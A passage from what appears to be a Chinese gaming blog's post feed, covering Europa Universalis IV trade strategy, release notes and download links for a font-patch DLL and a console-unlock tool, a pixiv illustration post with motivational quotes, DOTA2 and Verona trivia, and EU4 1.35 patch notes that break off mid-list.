title="贸易策略"></a>贸易策略</h2><p>其实说了这么多，贸易策略自然也就出来了。</p><p>尽可能的拥有贸易黑洞，是我们游戏中的贸易策略。</p><p><strong>为什么？</strong></p><p>因为下游总是可以影响到上游，20%。而贸易黑洞没有上游。</p><p>在不能拥有贸易黑洞的情况下，我们尽量把贸易本埠设置到，拥有最多贸易竞争力的下游去。</p><p><strong>为什么？</strong></p><p>因为在绝大部分情况下，下游节点收到的输入贸易值会比上游节点的输出贸易值多。我们把上游贸易转移到下游去，比我们在上游收钱拿到的钱更多。而且我们在非贸易本埠收钱会损失一半的金钱。</p><p>而如果你的贸易本埠不是在你拥有最多贸易竞争力的地方，举个例子，假设图中的英格兰占75%而勃艮第是25%但勃艮第依然还把这里设为贸易本埠的话，那么相当于给别人送钱…</p><p>如果你的贸易竞争力很分散（比如开局的法兰西），那么应该在各地都收钱而不转移，为了不给其他人送钱。</p><p>如果你的上下游被隔开了，一样的，在两地收钱。中继点会被敌人拿走大量的贸易。</p><p>贸易策略还影响整个游戏的逻辑。</p><p>为什么奥斯曼和马穆鲁克、威尼斯、必有一仗？因为马穆鲁克在贸易的上游，而威尼斯在贸易的下游。PS:亚历山大是很烂的贸易节点，因为会被无数多国家转移贸易。</p><p>为什么意大利越来越衰败？因为塞维利亚（西班牙）夺取了从非洲和新大陆流向热那亚的贸易。</p><p>亚丁为什么那么重要？因为亚丁决定了印度大陆和南亚的贸易流向。PS，现在不是那么重要了。现在南非更为重要一点。</p><p>为什么印度次大陆和墨西哥和中国无比重要？因为这里的商品单价高。如果你注意到公式和计算的话，你就知道商品单价是非常非常重要的。</p><p>而你已经达到贸易竞争力100%的土地上，集市等加贸易竞争力的建筑就不是那么必要了……因为已经100%了……这时候更优先造工厂。</p><p>优先在上游建造工厂，下游建造集市。因为工厂的加成是+1本地商品产出。即使是伦敦这样的城市，商品产出也只有2。</p><p>以上。谢谢您的观看~</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 教程 </tag>
            
            <tag> 黄埔兵书 </tag>
            
            <tag> 贸易 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【汉化双子节】EU4新版双字节补丁，Release 70，支持1.35.6</title>
      <link href="/1591.html"/>
      <url>/1591.html</url>
      
        <content type="html"><![CDATA[<p>霓虹大佬浑身都是肝，为了你，我要用建州女真成立日本！</p><h1 id="EU4DLL"><a href="#EU4DLL" class="headerlink" title="EU4DLL"></a>EU4DLL</h1><p>This dll makes it possible to display double-byte characters on Europa Universalis IV.</p><h2 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h2><ul><li>This project is <strong>unofficial</strong>.</li><li>Windows is supported and dll only works on Steam.</li><li>macOS is not supported. I don’t have those plans.</li><li>Linux is not supported.</li><li>Displaying very long tooltips can cause <strong>CTD</strong>. See <a href="https://github.com/matanki-saito/EU4dll/issues/226">here</a>.</li></ul><h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><ul><li><p>Manual install</p><ol><li>Download latest release zipped file and unpack it.</li><li>Put all files into the game directory.</li><li>Subscribe multibyte mods from steam or add mods to paradox user directory in your documents folder.</li><li>Enable mods on game luncher</li><li>Play game. 👍</li></ol></li><li><p>Automatic install</p><ol><li>Download <a href="https://github.com/matanki-saito/SimpleInstaller">Simple Installer</a></li><li>See <a href="https://paradoxian-japan-mod.com/page-1295/">Install Guide (Japanese)</a></li><li>Enable mods on game luncher</li><li>Play game. 👍</li></ol></li></ul><p>双子节使用可以查看<a href="https://blog.gjcloak.top/1806.html">这篇</a></p><details class="folding-tag" ><summary> Release 70 </summary>              <div class='content'>              <h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>1.35.6.0<br>new dll release!</p><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a class="btn-anzhiyu larger" href="/file/steam_EU4_fixdll_build_70.zip"   title="下载"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>下载</span></a></p>              </div>            </details><details class="folding-tag" ><summary> Release 69 </summary>              <div class='content'>              <h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>1.35.5.0<br>new dll release!</p><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a class="btn-anzhiyu larger" href="/file/steam_EU4_fixdll_build_69.zip"   title="下载"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>下载</span></a></p>              </div>            </details><details class="folding-tag" ><summary> Release 68 </summary>              <div class='content'>              <h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>1.35.4.0<br>new dll release!</p><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a class="btn-anzhiyu larger" href="/file/steam_EU4_fixdll_build_68.zip"   title="下载"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>下载</span></a></p>              </div>            </details><details class="folding-tag" ><summary> Release 67 </summary>              <div class='content'>              <h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>new dll release!</p><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a class="btn-anzhiyu larger" href="https://cdn.gjcloak.xyz/cloudreve/1/2023/05/06/1_20230506073819_steam_EU4_fixdll_build_67.zip"   title="下载"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>下载</span></a></p>              </div>            </details><details class="folding-tag" ><summary> Release 66 </summary>              <div class='content'>              <h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>new dll release!</p><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a class="btn-anzhiyu larger" href="/file/steam_EU4_fixdll_build_66.zip"   title="下载"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>下载</span></a></p>              </div>            </details><details class="folding-tag" ><summary> Release 65 </summary>              <div class='content'>              <h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>new dll release!</p><p>Fix <a href="https://github.com/matanki-saito/EU4dll/issues/134">#134</a></p><p>(before)<br><img src="https://cos.gjcloak.xyz/pigo/202308020908332.webp?imageMogr2/format/webp/interlace/1/quality/0"><br>(after)<br><img src="https://cos.gjcloak.xyz/pigo/202308020908636.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a class="btn-anzhiyu larger" href="/file/steam_EU4_fixdll_build_65.zip"   title="下载"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>下载</span></a></p>              </div>            </details><details class="folding-tag" ><summary> Release 64 </summary>              <div class='content'>              <h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>Find bug. Please use release 65</p><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a class="btn-anzhiyu larger" href="/file/steam_EU4_fixdll_build_64.zip"   title="下载"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>下载</span></a></p>              </div>            </details><details class="folding-tag" ><summary> Release 63 </summary>              <div class='content'>              <h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><p>new dll release!<br>v1.35.1.0</p><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a class="btn-anzhiyu larger" href="https://cdn.gjcloak.xyz/cloudreve/1/2023/04/22/1_20230422111412_steam_EU4_fixdll_build_63.zip"   title="下载"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>下载</span></a></p>              </div>            </details>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> P社 </tag>
            
            <tag> 汉化 </tag>
            
            <tag> 双子节 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.21pixiv插画分享</title>
      <link href="/1587.html"/>
      <url>/1587.html</url>
      
        <content type="html"><![CDATA[<p>全世界只有不到0.1%的人关注了我</p><p>你可真是个很特别的人~</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-78ae55a68ec749d37b077ea6bf329e6e.png"></p><p>1.你永远不知道未来的你 会有什么样的人生 会和什么样的人在一起恋爱 吃的是几块钱的早餐 生活的是几线城市 会给父母怎样的回报 越努力越幸运 你的余生还很长 要坚强地走下去 要做一个优秀的女孩儿 对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒情自卑的自己 既然认准一条路 那就坚持走下去 命运不会辜负每一个对自己认真而努力的人</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-872706a2ceaa12621c9be34dbcfc7a4b.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-67af32604dc89ef5fc68f387fc68ff17.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-adfdde1661f41fcaa61dcac2e629c0cb.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e663bfb4f5d7848135d069a92f6e160a.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e15b513e7c723e64dce37546f5455cea.png"><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-b70e9fdf540320be29e32dd53dfb384a.png"></p><p>2.我们总觉得自己还小 还能贪婪的享受所有美好 后来惊讶地发现自己不知从何开始 看得清糖衣里的炮弹 读得出微笑后的杀机 也懂得应付敷衍 逢场作戏 去面对好多自己 不曾想过要面对的事 表面上人畜无害 防身的刀却一直x在身后从未离手那一刻 我终于承认了成长这回事只是不知是好是坏.</p><p>3.不是所有女孩都梦想赚大钱 也不是所有女孩都想做女强人 但当体会过一次次被人肯定认可以后 当你知道自己除了等待还可以争取 当你经济独立自我创造安全感 当你学会了潇洒地笑 潇洒的活着 你会发现 自己爱自己比别人来爱你更有意</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-b07703f8b43703c02d1f5478c541b927.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-16a016b03e50d75f0ce46502a14f937b.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-46c4ba17517ef036e106c32a85729966.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-50646addf4e24df89aa3684eeb730f1f.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-03586acc65670de0d79dea2792949d45.png"></p><p>4.不管什么年纪 别辜负最好的自己！把每一句我不会“都改为我可以学” 把每一句我不敢“都改为我一定行” 尝试总比永远不敢开始要强.</p><p>5.心有所期 全力以赴 定有所成，不要假装努力因为结局不会陪你演戏，跨过星河 迈过月亮 去努力迎接更好的自己 ， 人生那么长，总要用力拼搏一次</p><p>6.生如蝼蚁当立鸿鹄之志，命薄似纸应有不屈之心。乾坤未定，你我皆是黑马。祝你飞黄腾达前程似锦。</p><p>7.总有一天你会明白 你的委屈要自己消化 你的秘密不能逢人就提起 真正能解脱自己的只能靠努力.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-b4af82963fedb7d5967fdad670e76cd0.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-1c962137ea8a1d5a0f206f9c5cf5216c.png"><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-33baa733b89b10989a25d4b17814f2cf.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-9e87256db391bc129197cfeb752c242f.png"></p><p>8.对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒憤自卑的自己 我始终相信一句话：只有自己足够强大 才不会被别人践踏.</p><p>9.有压力 但不要被压垮 迷茫但不要绝望 在冷言嘲笑中翻盘 成为别人的可望不可及 你真的努力过了才有资格说你拼过 你可以打败我 但永远也别想让我求饶 生命本该有意义 我们绝不是白来一场 不要指望谁会陪你一辈子 没光的时候连影子都会离开你.</p><p>10.你可以在夜晚里崩溃痛哭 但我希望天一亮你又能顶住来自四面八方的压力 继续生活.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-a42e858625cdc309b64b7f2c8ac4298e.png"></p><p>这期还满意吗❤</p>]]></content>
      
      
      <categories>
          
          <category> 山海图册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片 </tag>
            
            <tag> p站 </tag>
            
            <tag> 分享 </tag>
            
            <tag> 插画 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一图看完DOTA2大展宏图7.33更新</title>
      <link href="/43c77a85.html"/>
      <url>/43c77a85.html</url>
      
        <content type="html"><![CDATA[<p>这次更新不可谓不大，位置改变了，还新增了挺多东西，装备合成有些也调整了，刚打了两把感觉还不错，不多说了，看图</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230421195725-scaled.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dota2 </tag>
            
            <tag> 更新 </tag>
            
            <tag> 图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哪个国家的理念名称全部致敬了莎士比亚著名戏剧作品《罗密欧与朱丽叶》？</title>
      <link href="/1560.html"/>
      <url>/1560.html</url>
      
        <content type="html"><![CDATA[<p><strong>维罗纳</strong>（英文：<strong>Verona</strong>）是一个位于意大利北部的国家。 在1444年开局时，维罗纳并不存在，在任何时间的历史剧本中也都不可用。它的唯一核心领土开局时由 威尼斯控制，可被其释放或经由叛军产生。</p><h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>维罗纳与其它没有独立任务的意大利国家共用一组通用任务。</p><h2 id="决议"><a href="#决议" class="headerlink" title="决议"></a>决议</h2><p>作为拉丁文化组的国家，维罗纳可以成立意大利。</p><h2 id="逸闻"><a href="#逸闻" class="headerlink" title="逸闻"></a>逸闻</h2><p>维罗纳的国家理念名称全部来源于莎士比亚著名作品《罗密欧与朱丽叶》。</p><h2 id="开场白"><a href="#开场白" class="headerlink" title="开场白"></a>开场白</h2><p>以下中文译文均采用朱生豪译本。</p><p>英文原文</p><p>中文译文</p><p>Two <strong>households</strong>, both <strong>alike in dignity</strong>,</p><p>In <strong>fair Verona</strong>, where we lay our scene,</p><p><strong>故事发生在维洛那名城</strong>，</p><p>有两家<strong>门第相当的巨族</strong>，</p><p>From <strong>ancient grudge</strong> break to new mutiny,</p><p>Where <strong>civil blood</strong> makes <strong>civil hands</strong> unclean.</p><p><strong>累世的宿怨</strong>激起了新争，</p><p><strong>鲜血</strong>把<strong>市民的白手</strong>污渎。</p><p>…</p><p>……</p><p>Whole misadventured piteous overthrows</p><p>Do with their death bury their parents’ <strong>strife</strong>.</p><p>他们的悲惨凄凉的殒灭，</p><p>和解了他们<strong>交恶</strong>的尊亲。</p><p>…</p><p>……</p><p>第五幕第三场</p><p>以下中文译文均采用朱生豪译本。</p><p>英文原文</p><p>中文译文</p><p>PRINCE</p><p>亲王：</p><p>A glooming peace this morning with it brings;</p><p>The sun, for sorrow, will not show his head:</p><p>清晨带来了凄凉的和解，</p><p>太阳也惨得在云中躲闪。</p><p>Go hence, to have more talk of these sad things;</p><p><strong>Some shall be pardon’d</strong>, and <strong>some punished</strong>:</p><p>大家先回去发几声感慨，</p><p><strong>该恕的、该罚的再听宣判</strong>。</p><p><strong>For never was a story of more woe</strong></p><p>Than this of Juliet and her Romeo.</p><p>古往今来多少离合悲欢，</p><p><strong>谁曾见这样的哀怨辛酸</strong>！</p><p>Exeunt</p><p>（同下。）</p><p>这段台词是全剧的最后一段。</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 你知道吗 </tag>
            
            <tag> 罗密欧与朱丽叶 </tag>
            
            <tag> 莎士比亚 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EU4 1.35 CE 铁人控制台STEAM [20230418 更新]1.35.0版</title>
      <link href="/fe8da796.html"/>
      <url>/fe8da796.html</url>
      
        <content type="html"><![CDATA[<p>铁人 控制台. 1.35….steam版..<br>懂的自然懂…</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-30-1024x789.png"></p><p>eu4_for_1_35 Ironman_.zip</p><p><a href="https://cdn.gjcloak.xyz/cloudreve/1/2023/04/21/1_20230421150728_eu4_for_1_35%20Ironman_.zip">下载</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> steam </tag>
            
            <tag> 控制台 </tag>
            
            <tag> 铁人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《欧陆风云4》1.35版本</title>
      <link href="/10135e41.html"/>
      <url>/10135e41.html</url>
      
        <content type="html"><![CDATA[<p>1.35版本，代号“奥斯曼”，于2023年4月18日发布，校验码为d460。该版本与<a href="https://blog.gjcloak.top/1550.html">DLC 霸业</a>一同发布。</p><h2 id="扩展包特性"><a href="#扩展包特性" class="headerlink" title="扩展包特性"></a>扩展包特性</h2><ul><li>奥斯曼：新增含有68项任务的新任务树、2种特殊机制、12个新政府改革、新的耶尼切里阶层（附带有一系列新阶层特权、阶层议程和2种灾难）、5个新灾难、62个新事件、新附属国类型：行省，以及2种修会。</li><li>中国：新增5种新任务树（大明、建州&#x2F;满洲&#x2F;后金、大清、中国群雄、中国皇帝，总计77项新任务）、2个新政府改革、新的宦官阶层（附带有一系列新阶层特权、阶层议程和1个宦官夺权的灾难）、32个新事件、巡抚三司机制（使用修会机制），以及1种新直属州法令。</li><li>日本：新增含有30项任务的新任务树（符合条件时亦可获得中国皇帝任务树）、新政府机制（基督教日本可用）、6个新政府改革、1个新阶层特权、12个新事件，以及2个特有宣战理由。</li><li>俄罗斯：为莫斯科和俄罗斯新增含有57项任务的新任务树，为诺夫哥罗德新增7项新任务；为俄罗斯新增2种特殊机制（现代化和官秩表）、9个新政府改革、12个新阶层特权、65个新事件（含原有事件重做），以及2个新决议。</li><li>西班牙：扩展并重做了卡斯蒂利亚、阿拉贡和西班牙的任务树，新增20项新任务，新增1种特殊机制（咨议会行政制）、3个新政府改革、2个新阶层特权、1个灾难，以及7个新事件。</li><li>法兰西：新增含有68项任务的新任务树以及革命法兰西专属的16项额外任务、4个新政府改革、24个新事件，和新增的附属国类型：封邑。</li><li>大不列颠：为大不列颠新增了含有71项任务的新任务树、4个新政府改革、41个新事件、超过40项特殊议会相关改动、2种新附属国类型（商贸公司和贸易保护国），并重做了英国内战灾难。</li><li>普鲁士：重做了普鲁士任务树，新增了部分触发条件和奖励，添加了新机制（普鲁士军事化）和6个新事件。</li><li>葡萄牙：重做了葡萄牙任务树，新增了5个新任务，新增了部分触发条件和奖励，以及2个新政府改革。</li><li>朝鲜：新增了特殊政府机制（“Perfectionism”），可获得中国皇帝任务树，新增2个新政府改革，以及“高丽大藏经”相关事件和省份修正。</li><li>新增了68个特有政府改革，分别适用于不同国家和文化组。</li><li>新增了60个阶层特权，分别适用于各个阶层。每个阶层平均增加了5个新特权。</li><li>新增了9种特殊单位，其中3种为陆军单位（日本专属的“武士”、西班牙专属的“大方阵”和法兰西专属的“火枪手”），6种为海军单位（伊比利亚文化专属的“卡拉维尔帆船”和“盖伦帆船”、拉丁文化专属的“加莱赛战船”、朝鲜专属的“龟船”、大不列颠专属的“主力舰”Man-of-war和尼德兰专属的“东印度公司商船”）。</li><li>新增2个兵模包，一个用于法兰西文化组文化（法兰西、奥克、瓦隆和勃艮第文化小国）、一个用于东方文化（中华文化组南方小国、阿伊努、大理和菲律宾）。</li><li>新增3个音乐包，分别用于法兰西、奥斯曼和中国，以及DLC预购奖励的“March of Power”音乐包。</li></ul><h2 id="免费特性"><a href="#免费特性" class="headerlink" title="免费特性"></a>免费特性</h2><ul><li>添加了3个新理念组（基建理念、宫廷理念和佣兵理念），并进一步平衡了所有现有理念组。</li><li>添加了27个与新理念组相关的新事件。</li><li>添加了新一层级的政府改革，与军事学说有关，含7种改革。</li><li>添加了7个新阶层特权，用于目前尚无使其豁免征收领地的特权的阶层。</li><li>为DLC常识添加了7种新议会贿赂选项和全国贿赂选项，其中全国贿赂选项花费更高，但可一次涵盖多个议席。</li><li>为DLC天命添加了21种新天朝改革、21种新圣旨，并重做了特殊时代能力。</li><li>为DLC统治吧，不列颠尼亚添加了11种新海军学说。</li><li>为DLC黄金世纪添加了11种新修会。</li><li>为DLC皇帝添加了拉丁帝国tag，可经由十字军任务成立。</li><li>为DLC利维坦添加了7种新伟大工程。</li><li>添加了9个新成就。</li><li>重新添加了贸易保护国的附属国类型，可用于已通过决议“确立海权主义”的国家。</li><li>添加了一个议和选项，允许强行吞并使用迁徙机制的原住民国家。</li><li>添加了6种新炮兵单位。</li><li>为奥斯曼添加了27个新的趣味事件。</li><li>为俄罗斯添加了5个新的趣味事件。</li><li>为英格兰&#x2F;大不列颠添加了2个新的趣味事件。</li></ul><h2 id="游戏平衡"><a href="#游戏平衡" class="headerlink" title="游戏平衡"></a>游戏平衡</h2><h3 id="经济"><a href="#经济" class="headerlink" title="经济"></a>经济</h3><ul><li>如果宗主国进行了相应改革但其附属国没有，则“扩大教会权利”不再适用于附属国。</li><li>扩展基础设施现在将会使得开发成本降低 15% 而不是以往的 25%。</li><li>重商主义效果增强。当重商主义为 100 时，禁运效率会从 50% 提高到 100%，市民&#x2F;吠舍的忠诚均衡点会从 5% 提高到 10%。</li><li>省份叛乱度现在每有 1 点，将减少 2% 的省份税收修正。</li><li>省份税收现在将会提供 -2% 本地军团招募时间、-1% 本地重大项目升级时间、-1% 本地建设时间和 +2% 本地思潮传播。</li><li>通货膨胀现在也增加了传教士维护、升级伟大工程、接纳机构、调整殖民附属国、升级贸易中心和贸易公司投资的成本。</li><li>将法尔斯的颜色更改为薄荷绿。</li></ul><h3 id="政府"><a href="#政府" class="headerlink" title="政府"></a>政府</h3><ul><li>议会席位现在会给予省份**+10%<strong>本地水手修正与</strong>+15%**本地人力修正，而生产效率与人力不变。</li><li>给予省份议会席位现在会减少2点专制度，而不是3点，无论席位是自动给予的或是手动给予的。</li><li>贸易联盟的每一个成员现在都会给予联盟领袖**+5%<strong>贸易引导、</strong>+2<strong>海军上限、</strong>+1000<strong>水手上限、</strong>+1000<strong>人力上限以及</strong>+1**陆军上限。</li><li>现在拥有军事化机制时基础给予<strong>-0.5</strong>每月军事化，在战争中会给予**+0.1<strong>每月军事化，在和平中会给予</strong>-0.1**每月军事化，每点厌战度也会给予每月军事化减成。</li><li>谢契拉达政府改革现在解锁游牧理念，并奖励 25% 特殊单位上限。</li><li>谢契拉达现在可以使用阶层机制。其中包含哥萨克阶层。</li><li>“重选权正式化”政府改革现在与“尼德兰共和国”互斥，因为后者不允许强制重新选举。</li><li>原住民国家无法再从政府改革中获得陆军维护费修正、全局部队花费和人力恢复速度方面的加成。</li><li>天主教普鲁士或自定义国家现在可以获得普鲁士君主制的1级政府改革。</li><li>“地方议会”政府改革解锁的直属州法令“宗教宽容法令”现在给予的本地宗教统一度贡献从 50% 调整至 100%。</li><li>“维持权力平衡”政府改革奖励的所有阶层忠诚度从 5% 增加至 10%，并给予 +1 外交官。</li></ul><h3 id="宗教"><a href="#宗教" class="headerlink" title="宗教"></a>宗教</h3><ul><li>新教教会信条“教牧人员允许结婚”现在给予 -15% 同一宗教顾问花费，不再减少教士阶层影响力。</li><li>宣战现在不再对虔诚度产生影响。新统治者继位时虔诚度改为刷新为 0。</li><li>负虔诚度现在给予 -10% 理念花费，不再奖励 20% 要塞防御。</li><li>贸易公司减少的本地传教力量从 200% 调整至 20%。</li><li>教廷监护现在给予“派遣教廷使节”的奖励。</li><li>科普特正教给予的要塞防御从10%调整至15%。所有佛教信仰给予的异端容忍从+1调整至+2。神道教给予的+1异教容忍调整为+2异端容忍。</li><li>重制了改革宗热情机制。每个热情焦点花费的热情改为8，给予的修正得到加强。新增了“外交”热情焦点。</li><li>启用一个热情焦点的花费和维护费用从8改动至5。热情点现在给予-10%建筑花费、-10%稳定度花费、-5分离主义年数、+10%改善关系修正。 稳定焦点给予的-10%建筑花费改为-25%间谍行动花费。新增了“外交”热情焦点，奖励+2外交声誉、+25%改善关系修正、+10%所有阶层忠诚度均衡点。</li></ul><h3 id="单位"><a href="#单位" class="headerlink" title="单位"></a>单位</h3><ul><li>哥萨克特有的+10%冲击伤害增至+15%。</li><li>恰瓦花费的军事点数从5调整为2，新招募时改为具有50%初始兵力、10%士气。恰瓦军团现在具有-5%所受冲击伤害、-50%陆军损耗、+50%增援速度。</li><li>耶尼切里新招募时改为具有10%初始兵力、10%士气。特殊修正从+100%操练度获取修正、+100%补员花费改为+50%强攻要塞能力、+50%操练度获取修正。</li><li>哥萨克单位现在不再给予提升稳定度花费惩罚。</li><li>射击军现在不再给予提升稳定度花费惩罚，且获得+10%火力伤害、-10%所受火力伤害、+15%陆军维护费。</li></ul><h3 id="战争与和平"><a href="#战争与和平" class="headerlink" title="战争与和平"></a>战争与和平</h3><ul><li>荒废度给予的惩罚加倍。</li><li>被封锁的省份获得的本地贸易力量惩罚从-50%增至-100%。修建市场建筑将无法再完全抵消这一惩罚。</li><li>呼吁和平给予的厌战度从0.008调整至0.005。</li><li>重新平衡单位点数。削弱澳洲原住民和波利尼西亚兵种组单位，修正非洲、穆斯林兵种组单位随科技提升反而变弱的问题，削弱安纳托利亚兵种组的早期单位，对部分印度兵种组单位进行平衡。</li><li>“鼓舞人心的将领”将领特质现在除士气恢复速度之外，还奖励+5%陆军士气。</li><li>“生于马背之上”将领特质现在给予+100%骑兵比例。刷出改特质所需的骑兵比例从20%调整至30%。</li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul><li>改变宿敌的冷却年限从25年改为5年。</li><li>每1点原住民侵略性现在降低1%本地殖民几率。</li><li>热带省份给予的本地发展花费惩罚从10%调整至5%。</li></ul><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="外交"><a href="#外交" class="headerlink" title="外交"></a>外交</h3><ul><li>在会由于stability_cost_to_declare_war失去稳定度时，AI不会再宣战。</li></ul><h3 id="其它-1"><a href="#其它-1" class="headerlink" title="其它"></a>其它</h3><ul><li>修复了AI军队开始和停止移动的一个循环。</li><li>AI使用的炮兵将减少，尤其是收入低时。</li><li>海外属国宣布独立战争的倾向提高。</li><li>修复了部分情况下AI军队因惧怕敌军而不行动的问题。</li></ul><h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><h3 id="国家"><a href="#国家" class="headerlink" title="国家"></a>国家</h3><ul><li>根据社区玩家反馈，英格兰（ENG）国旗改为红底三狮，安茹（AVE）的国旗设为配有法国百合纹章的四等分旗帜（英格兰原有旗帜）。</li><li>葡萄牙的地图颜色改为蓝色！（作为代价，特雷姆森颜色做了相应改动）</li><li>普鲁士的地图颜色改为普鲁士蓝。</li></ul><h3 id="提示信息"><a href="#提示信息" class="headerlink" title="提示信息"></a>提示信息</h3><ul><li>改善了理念选择的提示框的大小。</li></ul><h3 id="单位模型"><a href="#单位模型" class="headerlink" title="单位模型"></a>单位模型</h3><ul><li>调整了英格兰、安茹、大不列颠和东印度公司的地图颜色。</li><li>调整了布拉班特、佛兰德的地图颜色，以与其各自的国旗颜色相配合，且更好地适配于瓦隆兵模。</li><li>调整了洛塔林吉亚的单位颜色。</li><li>大国单位包中的英格兰3级兵模的外衣饰面现在拥有动态颜色。</li><li>旧DLC中的英格兰兵模做了适配，以便于新增的盎格鲁瓦文化（法兰西文化组）也可使用。</li><li>新增的瓦隆兵模也适用于佛兰德文化。</li></ul><h2 id="用户模组制作"><a href="#用户模组制作" class="headerlink" title="用户模组制作"></a>用户模组制作</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><ul><li>Added guibounds command that allows debugging UI elements while doing UI mods.</li><li>Added set_country_flag and clr_country_flag.</li></ul><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><ul><li>Added change_country_color &#x3D; { country &#x3D; <country scope> &#x2F; color &#x3D; { r g b } } If the former argument is used then the country will adapt the color of the specified country scope. If the latter is used then a defined color will be used instead. Of course, it comes with a restore_country_color &#x3D; yes.</li><li>Added release_all_possible_countries &#x3D; yes #Country scope, the current country scope releases all countries which can be released from its owned provinces. If possible, the order should go from the smallest releasable to the biggest. If that is not possible then it should be just random.</li><li>Added janissary_infantry &#x3D; <country scope> #Province scope, spawns a janissary unit in the current province scope for the defined country scope.</li><li>Added revolutionary_guard_infantry &#x3D; <country scope> #Province scope, spawns a revolutionary guard unit in the current province scope for the defined country scope.</li><li>Added revolutionary_guard_cavalry &#x3D; <country scope> #Province scope, spawns a revolutionary guard cavalry unit in the current province scope for the defined country scope.</li><li>Added revolutionary_guard_artillery 